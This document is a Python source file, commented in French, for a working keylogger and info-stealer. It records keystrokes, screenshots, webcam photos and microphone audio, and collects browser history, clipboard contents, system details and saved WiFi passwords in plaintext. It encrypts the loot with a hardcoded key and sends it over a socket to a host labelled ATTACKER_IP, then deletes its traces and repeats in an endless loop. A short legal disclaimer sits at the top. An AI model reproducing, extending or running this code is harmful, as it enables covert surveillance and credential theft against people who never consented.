# pylint: disable=E1101,I1101,W0106
"""
This tool may be used for legal purposes only.
Users take full responsibility for any actions performed using this tool.
The author accepts no liability for damage caused by this tool.
If these terms are not acceptable to you, then do not use this tool.
"""

import json
import logging
import os
import re
import shutil
import socket
import sys
import tarfile
import time
from multiprocessing import Process
from pathlib import Path
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread

# External Modules #
import browserhistory as bh
import requests
from cryptography.fernet import Fernet
from pynput.keyboard import Listener

# Import optionnels avec gestion d'erreur robuste
try:
    from PIL import ImageGrab
    PILLOW_AVAILABLE = True
except ImportError:
    PILLOW_AVAILABLE = False
    print("⚠ Pillow non disponible - screenshots désactivés")

try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False
    print("⚠ OpenCV non disponible - webcam désactivée")

try:
    import sounddevice
    from scipy.io.wavfile import write as write_rec
    SOUNDDEVICE_AVAILABLE = True
except ImportError:
    SOUNDDEVICE_AVAILABLE = False
    print("⚠ SoundDevice/Scipy non disponible - microphone désactivé")

# If the OS is Windows #
if os.name == 'nt':
    try:
        import win32clipboard
        WIN32_AVAILABLE = True
    except ImportError:
        WIN32_AVAILABLE = False
else:
    WIN32_AVAILABLE = False

# Configuration
ATTACKER_IP = "192.168.56.11"
ATTACKER_PORT = 8888
KEY = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

def network_transfer(export_path: Path):
    """
    Transfère les fichiers chiffrés via le réseau local
    """
    try:
        # Vérifier s'il y a des fichiers
        files = list(export_path.iterdir())
        if not files:
            print("❌ Aucun fichier à transférer")
            return False
            
        # Créer une archive
        archive_path = export_path / "data.tar.gz"
        with tarfile.open(archive_path, "w:gz") as tar:
            for file in files:
                if file.is_file():
                    tar.add(file, arcname=file.name)
        
        print(f"📦 Archive créée: {archive_path} ({archive_path.stat().st_size} octets)")
        
        # Envoyer via socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(30)
            print(f"🔗 Connexion à {ATTACKER_IP}:{ATTACKER_PORT}...")
            sock.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # Envoyer la taille du fichier
            file_size = os.path.getsize(archive_path)
            sock.send(file_size.to_bytes(8, byteorder='big'))
            
            # Envoyer le fichier
            with open(archive_path, 'rb') as f:
                total_sent = 0
                while True:
                    data = f.read(4096)
                    if not data:
                        break
                    sent = sock.send(data)
                    total_sent += sent
            
            print(f"✅ Données envoyées à {ATTACKER_IP}:{ATTACKER_PORT} ({total_sent} octets)")
        
        # Nettoyer
        archive_path.unlink()
        return True
        
    except Exception as e:
        print(f"❌ Erreur transfert réseau: {e}")
        return False

def encrypt_data(files: list, export_path: Path):
    """
    Encrypts all the file data
    """
    encrypted_count = 0
    for file in files:
        file_path = export_path / file
        
        # Vérifier si le fichier existe
        if not file_path.exists():
            print(f"⚠ Fichier {file} non trouvé, ignoré")
            continue
            
        crypt_path = export_path / f'e_{file}'
        try:
            with file_path.open('rb') as plain_text:
                data = plain_text.read()

            encrypted = Fernet(KEY).encrypt(data)

            with crypt_path.open('wb') as hidden_data:
                hidden_data.write(encrypted)

            file_path.unlink()
            encrypted_count += 1
            print(f"✅ {file} chiffré")

        except OSError as file_err:
            print(f"❌ Erreur avec {file}: {file_err}")
    
    print(f"🔒 {encrypted_count} fichiers chiffrés sur {len(files)}")

class RegObject:
    def __init__(self):
        self.re_xml = re.compile(r'.{1,255}\.xml$')
        self.re_txt = re.compile(r'.{1,255}\.txt$')
        self.re_png = re.compile(r'.{1,255}\.png$')
        self.re_jpg = re.compile(r'.{1,255}\.jpg$')
        if os.name == 'nt':
            self.re_audio = re.compile(r'.{1,255}\.wav$')
        else:
            self.re_audio = re.compile(r'.{1,255}\.mp4')

def webcam(webcam_path: Path):
    """Capture webcam pictures avec gestion d'erreurs renforcée"""
    if not CV2_AVAILABLE:
        print("❌ Webcam désactivée (OpenCV manquant)")
        return
        
    try:
        webcam_path.mkdir(parents=True, exist_ok=True)
        print("📷 Tentative d'accès à la webcam...")
        cam = cv2.VideoCapture(0)
        
        if not cam.isOpened():
            print("❌ Webcam non accessible")
            return

        print("✅ Webcam accessible, capture en cours...")
        for current in range(1, 3):  # 2 photos seulement pour test
            ret, img = cam.read()
            if ret:
                file_path = webcam_path / f'{current}_webcam.jpg'
                cv2.imwrite(str(file_path), img)
                print(f"✅ Photo webcam {current} sauvegardée")
            else:
                print(f"❌ Erreur capture webcam {current}")
            time.sleep(1)

        cam.release()
        
    except Exception as e:
        print(f"❌ Erreur webcam: {e}")

def microphone(mic_path: Path):
    """Enregistrement microphone avec gestion d'erreurs"""
    if not SOUNDDEVICE_AVAILABLE:
        print("❌ Microphone désactivé (sounddevice manquant)")
        return
        
    try:
        frames_per_second = 44100
        seconds = 5  # Réduit à 5 secondes

        print("🎤 Démarrage enregistrement audio...")
        for current in range(1, 2):  # 1 enregistrement seulement
            if os.name == 'nt':
                channel = 2
                rec_name = mic_path / f'{current}mic_recording.wav'
            else:
                channel = 1
                rec_name = mic_path / f'{current}mic_recording.mp4'

            print(f"🎤 Enregistrement audio {current}...")
            my_recording = sounddevice.rec(int(seconds * frames_per_second),
                                        samplerate=frames_per_second, channels=channel)
            sounddevice.wait()
            write_rec(str(rec_name), frames_per_second, my_recording)
            print(f"✅ Enregistrement {current} sauvegardé")
            
    except Exception as e:
        print(f"❌ Erreur microphone: {e}")

def screenshot(screenshot_path: Path):
    """Capture d'écran avec gestion d'erreurs"""
    if not PILLOW_AVAILABLE:
        print("❌ Screenshots désactivés (Pillow manquant)")
        return
        
    try:
        screenshot_path.mkdir(parents=True, exist_ok=True)
        print("📸 Capture d'écran en cours...")

        for current in range(1, 3):  # 2 screenshots seulement
            try:
                pic = ImageGrab.grab()
                capture_path = screenshot_path / f'{current}_screenshot.png'
                pic.save(capture_path)
                print(f"✅ Screenshot {current} sauvegardé")
                time.sleep(2)
            except Exception as e:
                print(f"❌ Erreur screenshot {current}: {e}")
            
    except Exception as e:
        print(f"❌ Erreur générale screenshot: {e}")

def log_keys(key_path: Path):
    """Enregistrement des frappes clavier"""
    try:
        logging.basicConfig(filename=key_path, level=logging.DEBUG,
                            format='%(asctime)s: %(message)s')
        print("⌨ Keylogger actif - Tapez quelques touches (Ctrl+C pour arrêter)...")
        
        def on_press(key):
            try:
                logging.info(str(key))
            except Exception as e:
                print(f"❌ Erreur enregistrement touche: {e}")
        
        with Listener(on_press=on_press) as listener:
            listener.join()
            
    except Exception as e:
        print(f"❌ Erreur keylogger: {e}")

def get_browser_history(browser_file: Path):
    """Récupère l'historique du navigateur"""
    try:
        print("🌐 Récupération historique navigateur...")
        bh_user = bh.get_username()
        db_path = bh.get_database_paths()
        hist = bh.get_browserhistory()
        browser_history = []
        browser_history.extend((bh_user, db_path, hist))

        with browser_file.open('w', encoding='utf-8') as browser_txt:
            browser_txt.write(json.dumps(browser_history))
        print("✅ Historique navigateur récupéré")
        
    except Exception as e:
        print(f"❌ Erreur historique navigateur: {e}")

def get_clipboard(export_path: Path):
    """Récupère le contenu du presse-papiers"""
    if not WIN32_AVAILABLE:
        print("❌ Presse-papiers désactivé (win32clipboard manquant)")
        return

    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
    except (OSError, TypeError):
        pasted_data = ''
    finally:
        win32clipboard.CloseClipboard()

    clip_path = export_path / 'clipboard_info.txt'
    try:
        with clip_path.open('w', encoding='utf-8') as clipboard_info:
            clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')
        print("✅ Presse-papiers récupéré")
    except OSError as file_err:
        print(f"❌ Erreur presse-papiers: {file_err}")

def get_system_info(sysinfo_file: Path):
    """Récupère les informations système"""
    try:
        print("💻 Récupération informations système...")
        if os.name == 'nt':
            syntax = ['systeminfo', '&', 'tasklist', '&', 'sc', 'query']
        else:
            cmd0 = 'hostnamectl'
            cmd1 = 'lscpu'
            cmd2 = 'lsmem'
            cmd3 = 'lsusb'
            cmd4 = 'lspci'
            cmd5 = 'lshw'
            cmd6 = 'lsblk'
            cmd7 = 'df -h'
            syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}; {cmd4}; {cmd5}; {cmd6}; {cmd7}'

        with sysinfo_file.open('a', encoding='utf-8') as system_info:
            with Popen(syntax, stdout=system_info, stderr=system_info, shell=True) as get_sysinfo:
                get_sysinfo.communicate(timeout=20)
        print("✅ Informations système récupérées")
                
    except (OSError, TimeoutExpired) as e:
        print(f"❌ Erreur informations système: {e}")

def linux_wifi_query(export_path: Path):
    """Récupère les informations WiFi (Linux seulement)"""
    if os.name == 'nt':
        return

    try:
        print("📶 Récupération informations WiFi...")
        get_wifis = None
        wifi_path = export_path / 'wifi_info.txt'

        get_wifis = check_output(['nmcli', '-g', 'NAME', 'connection', 'show'])
        
        if get_wifis:
            wifi_count = 0
            for wifi in get_wifis.split(b'\n'):
                if b'Wired' not in wifi and wifi.strip():
                    wifi_count += 1
                    with wifi_path.open('w', encoding='utf-8') as wifi_list:
                        with Popen(f'nmcli -s connection show {wifi.decode()}', 
                                  stdout=wifi_list, stderr=wifi_list, shell=True) as command:
                            command.communicate(timeout=10)
            print(f"✅ {wifi_count} réseaux WiFi récupérés")
            
    except Exception as e:
        print(f"❌ Erreur informations WiFi: {e}")

def get_network_info(export_path: Path, network_file: Path):
    """Récupère les informations réseau"""
    try:
        print("🌐 Récupération informations réseau...")
        if os.name == 'nt':
            syntax = ['Netsh', 'WLAN', 'export', 'profile',
                      f'folder={str(export_path)}',
                      'key=clear', '&', 'ipconfig', '/all', '&', 'arp', '-a', '&',
                      'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a']
        else:
            linux_wifi_query(export_path)
            cmd0 = 'ifconfig'
            cmd1 = 'arp -a'
            cmd2 = 'route'
            cmd3 = 'netstat -a'
            syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}'

        with network_file.open('w', encoding='utf-8') as network_io:
            try:
                with Popen(syntax, stdout=network_io, stderr=network_io, shell=True) as commands:
                    commands.communicate(timeout=30)
            except TimeoutExpired:
                print("⚠ Timeout commandes réseau")

            hostname = socket.gethostname()
            ip_addr = socket.gethostbyname(hostname)

            try:
                public_ip = requests.get('https://api.ipify.org', timeout=10).text
            except requests.ConnectionError:
                public_ip = 'Non disponible'

            network_io.write(f'[!] Public IP Address: {public_ip}\n'
                             f'[!] Private IP Address: {ip_addr}\n')

        print("✅ Informations réseau récupérées")
            
    except Exception as e:
        print(f"❌ Erreur informations réseau: {e}")

def main():
    # Créer le dossier temporaire
    if os.name == 'nt':
        export_path = Path('C:\\Tmp\\')
    else:
        export_path = Path('/tmp/logs/')

    export_path.mkdir(parents=True, exist_ok=True)
    print(f"📁 Dossier de travail: {export_path}")

    # Fichiers de sortie
    network_file = export_path / 'network_info.txt'
    sysinfo_file = export_path / 'system_info.txt'
    browser_file = export_path / 'browser_info.txt'
    log_file = export_path / 'key_logs.txt'
    screenshot_dir = export_path / 'Screenshots'
    webcam_dir = export_path / 'WebcamPics'

    print("🔍 Début de la collecte des données...")

    # Collecte des données de base (système, réseau, navigateur)
    get_network_info(export_path, network_file)
    get_system_info(sysinfo_file)

    if os.name == 'nt' and WIN32_AVAILABLE:
        get_clipboard(export_path)

    get_browser_history(browser_file)

    print("🚀 Démarrage des modules de surveillance...")

    # Démarrer les processus de monitoring
    processes = []
    
    # Keylogger (toujours actif)
    proc_1 = Process(target=log_keys, args=(log_file,))
    proc_1.start()
    processes.append(proc_1)

    # Screenshots (optionnel)
    if PILLOW_AVAILABLE:
        proc_2 = Thread(target=screenshot, args=(screenshot_dir,))
        proc_2.start()
        processes.append(proc_2)

    # Microphone (optionnel)
    if SOUNDDEVICE_AVAILABLE:
        proc_3 = Thread(target=microphone, args=(export_path,))
        proc_3.start()
        processes.append(proc_3)

    # Webcam (optionnel)
    if CV2_AVAILABLE:
        proc_4 = Thread(target=webcam, args=(webcam_dir,))
        proc_4.start()
        processes.append(proc_4)

    # Attente de fin (30 secondes pour les tests)
    print("⏳ Collecte en cours (30 secondes)...")
    timeout = 30
    
    for proc in processes:
        if hasattr(proc, 'join'):
            proc.join(timeout=timeout)
        if hasattr(proc, 'terminate'):
            try:
                proc.terminate()
            except:
                pass

    # Préparation des fichiers pour chiffrement
    files = []
    expected_files = ['network_info.txt', 'system_info.txt', 'browser_info.txt', 'key_logs.txt']
    
    for file in expected_files:
        if (export_path / file).exists():
            files.append(file)
        else:
            print(f"⚠ Fichier {file} non généré")

    # Ajouter les fichiers spécifiques à l'OS
    if os.name == 'nt':
        if (export_path / 'clipboard_info.txt').exists():
            files.append('clipboard_info.txt')
    else:
        if (export_path / 'wifi_info.txt').exists():
            files.append('wifi_info.txt')

    print(f"📄 Fichiers à chiffrer: {files}")

    # Chiffrement
    if files:
        print("🔒 Chiffrement des fichiers...")
        encrypt_data(files, export_path)
    else:
        print("❌ Aucun fichier à chiffrer")

    # Transfert réseau
    print("📡 Envoi des données...")
    success = network_transfer(export_path)
    
    # Transférer les dossiers s'ils existent
    if success:
        for folder in [screenshot_dir, webcam_dir]:
            if folder.exists() and any(folder.iterdir()):
                print(f"📁 Envoi du dossier {folder.name}...")
                network_transfer(folder)

    # Nettoyage
    print("🧹 Nettoyage...")
    try:
        shutil.rmtree(export_path, ignore_errors=True)
    except:
        pass

    print("✅ Cycle terminé")
    print("🔄 Redémarrage dans 30 secondes...")
    time.sleep(30)
    print("\n" + "="*50)
    main()

def print_err(msg: str):
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n⏹ Arrêt demandé par l\'utilisateur')
        sys.exit(0)
    except Exception as ex:
        print(f'\n❌ Erreur critique: {ex}')
        import traceback
        traceback.print_exc()
        sys.exit(1)